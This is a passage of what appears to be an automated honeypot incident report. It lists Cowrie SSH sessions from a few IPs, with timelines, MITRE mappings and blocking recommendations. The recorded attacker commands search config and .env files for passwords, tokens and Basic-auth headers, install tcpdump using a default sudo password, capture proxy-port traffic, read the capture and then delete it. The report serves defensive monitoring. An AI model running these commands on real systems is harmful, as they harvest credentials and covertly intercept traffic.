| `2026-07-13 12:40:41` | `cowrie.log.closed` |
| `2026-07-13 12:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51f5954e21a

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'Authorization:.*Basic' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:42` | `cowrie.session.connect` |
| `2026-07-13 12:40:42` | `cowrie.client.version` |
| `2026-07-13 12:40:42` | `cowrie.client.kex` |
| `2026-07-13 12:40:43` | `cowrie.login.success` |
| `2026-07-13 12:40:44` | `cowrie.client.var` |
| `2026-07-13 12:40:44` | `cowrie.client.var` |
| `2026-07-13 12:40:44` | `cowrie.session.params` |
| `2026-07-13 12:40:44` | `cowrie.command.input` |
| `2026-07-13 12:40:44` | `cowrie.log.closed` |
| `2026-07-13 12:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16cd04a3d84e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'Authorization:.*Basic|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:45` | `cowrie.session.connect` |
| `2026-07-13 12:40:45` | `cowrie.client.version` |
| `2026-07-13 12:40:45` | `cowrie.client.kex` |
| `2026-07-13 12:40:46` | `cowrie.login.success` |
| `2026-07-13 12:40:47` | `cowrie.client.var` |
| `2026-07-13 12:40:47` | `cowrie.client.var` |
| `2026-07-13 12:40:48` | `cowrie.session.params` |
| `2026-07-13 12:40:48` | `cowrie.command.input` |
| `2026-07-13 12:40:48` | `cowrie.log.closed` |
| `2026-07-13 12:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65bf1033720

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'Authorization:.*Basic|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:48` | `cowrie.session.connect` |
| `2026-07-13 12:40:48` | `cowrie.client.version` |
| `2026-07-13 12:40:49` | `cowrie.client.kex` |
| `2026-07-13 12:40:50` | `cowrie.login.success` |
| `2026-07-13 12:40:50` | `cowrie.client.var` |
| `2026-07-13 12:40:50` | `cowrie.client.var` |
| `2026-07-13 12:40:51` | `cowrie.session.params` |
| `2026-07-13 12:40:51` | `cowrie.command.input` |
| `2026-07-13 12:40:51` | `cowrie.log.closed` |
| `2026-07-13 12:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4c4f799cf4

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'Authorization:.*Basic|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:52` | `cowrie.session.connect` |
| `2026-07-13 12:40:52` | `cowrie.client.version` |
| `2026-07-13 12:40:52` | `cowrie.client.kex` |
| `2026-07-13 12:40:53` | `cowrie.login.success` |
| `2026-07-13 12:40:54` | `cowrie.client.var` |
| `2026-07-13 12:40:54` | `cowrie.client.var` |
| `2026-07-13 12:40:54` | `cowrie.session.params` |
| `2026-07-13 12:40:54` | `cowrie.command.input` |
| `2026-07-13 12:40:54` | `cowrie.log.closed` |
| `2026-07-13 12:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed33850f863

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:54` | `cowrie.session.connect` |
| `2026-07-13 12:40:54` | `cowrie.client.version` |
| `2026-07-13 12:40:54` | `cowrie.client.kex` |
| `2026-07-13 12:40:55` | `cowrie.login.success` |
| `2026-07-13 12:40:56` | `cowrie.session.params` |
| `2026-07-13 12:40:56` | `cowrie.command.input` |
| `2026-07-13 12:40:57` | `cowrie.log.closed` |
| `2026-07-13 12:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d45e65e85f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'Authorization:.*Basic|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:55` | `cowrie.session.connect` |
| `2026-07-13 12:40:55` | `cowrie.client.version` |
| `2026-07-13 12:40:55` | `cowrie.client.kex` |
| `2026-07-13 12:40:57` | `cowrie.login.success` |
| `2026-07-13 12:40:57` | `cowrie.client.var` |
| `2026-07-13 12:40:57` | `cowrie.client.var` |
| `2026-07-13 12:40:58` | `cowrie.session.params` |
| `2026-07-13 12:40:58` | `cowrie.command.input` |
| `2026-07-13 12:40:58` | `cowrie.log.closed` |
| `2026-07-13 12:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce93a661997

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:40 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'Authorization:.*Basic|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:40:58` | `cowrie.session.connect` |
| `2026-07-13 12:40:58` | `cowrie.client.version` |
| `2026-07-13 12:40:59` | `cowrie.client.kex` |
| `2026-07-13 12:41:00` | `cowrie.login.success` |
| `2026-07-13 12:41:01` | `cowrie.client.var` |
| `2026-07-13 12:41:01` | `cowrie.client.var` |
| `2026-07-13 12:41:01` | `cowrie.session.params` |
| `2026-07-13 12:41:01` | `cowrie.command.input` |
| `2026-07-13 12:41:01` | `cowrie.log.closed` |
| `2026-07-13 12:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b983fed2620d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'Authorization:.*Basic|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:02` | `cowrie.session.connect` |
| `2026-07-13 12:41:02` | `cowrie.client.version` |
| `2026-07-13 12:41:02` | `cowrie.client.kex` |
| `2026-07-13 12:41:03` | `cowrie.login.success` |
| `2026-07-13 12:41:04` | `cowrie.client.var` |
| `2026-07-13 12:41:04` | `cowrie.client.var` |
| `2026-07-13 12:41:04` | `cowrie.session.params` |
| `2026-07-13 12:41:04` | `cowrie.command.input` |
| `2026-07-13 12:41:04` | `cowrie.log.closed` |
| `2026-07-13 12:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ee6e7540315

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'Authorization:.*Basic|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:05` | `cowrie.session.connect` |
| `2026-07-13 12:41:05` | `cowrie.client.version` |
| `2026-07-13 12:41:05` | `cowrie.client.kex` |
| `2026-07-13 12:41:07` | `cowrie.login.success` |
| `2026-07-13 12:41:07` | `cowrie.client.var` |
| `2026-07-13 12:41:07` | `cowrie.client.var` |
| `2026-07-13 12:41:08` | `cowrie.session.params` |
| `2026-07-13 12:41:08` | `cowrie.command.input` |
| `2026-07-13 12:41:08` | `cowrie.log.closed` |
| `2026-07-13 12:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82ddddf05f52

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'connect.*login' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:08` | `cowrie.session.connect` |
| `2026-07-13 12:41:08` | `cowrie.client.version` |
| `2026-07-13 12:41:08` | `cowrie.client.kex` |
| `2026-07-13 12:41:10` | `cowrie.login.success` |
| `2026-07-13 12:41:10` | `cowrie.client.var` |
| `2026-07-13 12:41:10` | `cowrie.client.var` |
| `2026-07-13 12:41:11` | `cowrie.session.params` |
| `2026-07-13 12:41:11` | `cowrie.command.input` |
| `2026-07-13 12:41:11` | `cowrie.log.closed` |
| `2026-07-13 12:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdca80267253

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'connect.*login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:11` | `cowrie.session.connect` |
| `2026-07-13 12:41:11` | `cowrie.client.version` |
| `2026-07-13 12:41:12` | `cowrie.client.kex` |
| `2026-07-13 12:41:13` | `cowrie.login.success` |
| `2026-07-13 12:41:13` | `cowrie.client.var` |
| `2026-07-13 12:41:13` | `cowrie.client.var` |
| `2026-07-13 12:41:14` | `cowrie.session.params` |
| `2026-07-13 12:41:14` | `cowrie.command.input` |
| `2026-07-13 12:41:14` | `cowrie.log.closed` |
| `2026-07-13 12:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538e4f1f050e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'connect.*login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:15` | `cowrie.session.connect` |
| `2026-07-13 12:41:15` | `cowrie.client.version` |
| `2026-07-13 12:41:15` | `cowrie.client.kex` |
| `2026-07-13 12:41:16` | `cowrie.login.success` |
| `2026-07-13 12:41:17` | `cowrie.client.var` |
| `2026-07-13 12:41:17` | `cowrie.client.var` |
| `2026-07-13 12:41:17` | `cowrie.session.params` |
| `2026-07-13 12:41:17` | `cowrie.command.input` |
| `2026-07-13 12:41:17` | `cowrie.log.closed` |
| `2026-07-13 12:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65010e6eef76

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'connect.*login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:18` | `cowrie.session.connect` |
| `2026-07-13 12:41:18` | `cowrie.client.version` |
| `2026-07-13 12:41:18` | `cowrie.client.kex` |
| `2026-07-13 12:41:19` | `cowrie.login.success` |
| `2026-07-13 12:41:20` | `cowrie.client.var` |
| `2026-07-13 12:41:20` | `cowrie.client.var` |
| `2026-07-13 12:41:21` | `cowrie.session.params` |
| `2026-07-13 12:41:21` | `cowrie.command.input` |
| `2026-07-13 12:41:21` | `cowrie.log.closed` |
| `2026-07-13 12:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305864fbbf8d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'connect.*login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:21` | `cowrie.session.connect` |
| `2026-07-13 12:41:21` | `cowrie.client.version` |
| `2026-07-13 12:41:22` | `cowrie.client.kex` |
| `2026-07-13 12:41:23` | `cowrie.login.success` |
| `2026-07-13 12:41:23` | `cowrie.client.var` |
| `2026-07-13 12:41:23` | `cowrie.client.var` |
| `2026-07-13 12:41:24` | `cowrie.session.params` |
| `2026-07-13 12:41:24` | `cowrie.command.input` |
| `2026-07-13 12:41:24` | `cowrie.log.closed` |
| `2026-07-13 12:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25cb07b90d6

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'connect.*login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:24` | `cowrie.session.connect` |
| `2026-07-13 12:41:24` | `cowrie.client.version` |
| `2026-07-13 12:41:25` | `cowrie.client.kex` |
| `2026-07-13 12:41:26` | `cowrie.login.success` |
| `2026-07-13 12:41:27` | `cowrie.client.var` |
| `2026-07-13 12:41:27` | `cowrie.client.var` |
| `2026-07-13 12:41:27` | `cowrie.session.params` |
| `2026-07-13 12:41:27` | `cowrie.command.input` |
| `2026-07-13 12:41:27` | `cowrie.log.closed` |
| `2026-07-13 12:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510e3fda88bf

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'connect.*login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:28` | `cowrie.session.connect` |
| `2026-07-13 12:41:28` | `cowrie.client.version` |
| `2026-07-13 12:41:28` | `cowrie.client.kex` |
| `2026-07-13 12:41:29` | `cowrie.login.success` |
| `2026-07-13 12:41:30` | `cowrie.client.var` |
| `2026-07-13 12:41:30` | `cowrie.client.var` |
| `2026-07-13 12:41:30` | `cowrie.session.params` |
| `2026-07-13 12:41:30` | `cowrie.command.input` |
| `2026-07-13 12:41:30` | `cowrie.log.closed` |
| `2026-07-13 12:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b30f4db6a0

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'connect.*login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:31` | `cowrie.session.connect` |
| `2026-07-13 12:41:31` | `cowrie.client.version` |
| `2026-07-13 12:41:31` | `cowrie.client.kex` |
| `2026-07-13 12:41:33` | `cowrie.login.success` |
| `2026-07-13 12:41:33` | `cowrie.client.var` |
| `2026-07-13 12:41:33` | `cowrie.client.var` |
| `2026-07-13 12:41:34` | `cowrie.session.params` |
| `2026-07-13 12:41:34` | `cowrie.command.input` |
| `2026-07-13 12:41:34` | `cowrie.log.closed` |
| `2026-07-13 12:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377fdf701466

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'raspberry' | sudo -S which tcpdump 2>/dev/null || (apt-get update -qq && apt-get install -y -qq tcpdump 2>/dev/null) || true, apt-get update -qq, apt-get install -y -qq tcpdump 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:34` | `cowrie.session.connect` |
| `2026-07-13 12:41:34` | `cowrie.client.version` |
| `2026-07-13 12:41:34` | `cowrie.client.kex` |
| `2026-07-13 12:41:36` | `cowrie.login.success` |
| `2026-07-13 12:41:36` | `cowrie.client.var` |
| `2026-07-13 12:41:36` | `cowrie.client.var` |
| `2026-07-13 12:41:37` | `cowrie.session.params` |
| `2026-07-13 12:41:37` | `cowrie.command.input` |
| `2026-07-13 12:41:37` | `cowrie.command.input` |
| `2026-07-13 12:41:37` | `cowrie.command.input` |
| `2026-07-13 12:41:37` | `cowrie.log.closed` |
| `2026-07-13 12:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0d235ac3b22

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:41 |
| **Last Seen** | 2026-07-13 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `nohup sudo tcpdump -i any -w /tmp/proxy_capture_129.80.119.236_22.pcap 'port 3128 or port 3129 or port 8080 or port 8888 or port 1080 or port 8118 or port 8123 or port 8388 or port 1080 or port 10808 or port 10809 or port 7890 or port 7891 or port 3128 or port 1080 or port 8080 or port 80 or port 443 or port 8080 or port 80 or port 443 or port 8080 or port 1080 or port 3128 or port 8888 or port 8443 or port 9090' -G 300 -W 1 > /dev/null 2>&1 &` |
| **TTPs (MITRE)** | T1057 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:41:37` | `cowrie.session.connect` |
| `2026-07-13 12:41:37` | `cowrie.client.version` |
| `2026-07-13 12:41:37` | `cowrie.client.kex` |
| `2026-07-13 12:41:39` | `cowrie.login.success` |
| `2026-07-13 12:41:39` | `cowrie.client.var` |
| `2026-07-13 12:41:39` | `cowrie.client.var` |
| `2026-07-13 12:41:40` | `cowrie.session.params` |
| `2026-07-13 12:41:40` | `cowrie.command.input` |
| `2026-07-13 12:41:40` | `cowrie.log.closed` |
| `2026-07-13 12:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0381ed920907

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:47 |
| **Last Seen** | 2026-07-13 12:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sudo tcpdump -r /tmp/proxy_capture_129.80.119.236_22.pcap -A 2>/dev/null | strings` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:47:14` | `cowrie.session.connect` |
| `2026-07-13 12:47:14` | `cowrie.client.version` |
| `2026-07-13 12:47:14` | `cowrie.client.kex` |
| `2026-07-13 12:47:15` | `cowrie.login.success` |
| `2026-07-13 12:47:16` | `cowrie.client.var` |
| `2026-07-13 12:47:16` | `cowrie.client.var` |
| `2026-07-13 12:47:16` | `cowrie.session.params` |
| `2026-07-13 12:47:16` | `cowrie.command.input` |
| `2026-07-13 12:47:16` | `cowrie.command.failed` |
| `2026-07-13 12:47:16` | `cowrie.log.closed` |
| `2026-07-13 12:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8283b9d6d0b9

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:47 |
| **Last Seen** | 2026-07-13 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `rm -f /tmp/proxy_capture_129.80.119.236_22.pcap` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:47:17` | `cowrie.session.connect` |
| `2026-07-13 12:47:17` | `cowrie.client.version` |
| `2026-07-13 12:47:17` | `cowrie.client.kex` |
| `2026-07-13 12:47:18` | `cowrie.login.success` |
| `2026-07-13 12:47:19` | `cowrie.client.var` |
| `2026-07-13 12:47:19` | `cowrie.client.var` |
| `2026-07-13 12:47:19` | `cowrie.session.params` |
| `2026-07-13 12:47:19` | `cowrie.command.input` |
| `2026-07-13 12:47:19` | `cowrie.log.closed` |
| `2026-07-13 12:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8918658b7505

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]7` |
| **First Seen** | 2026-07-13 12:47 |
| **Last Seen** | 2026-07-13 12:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
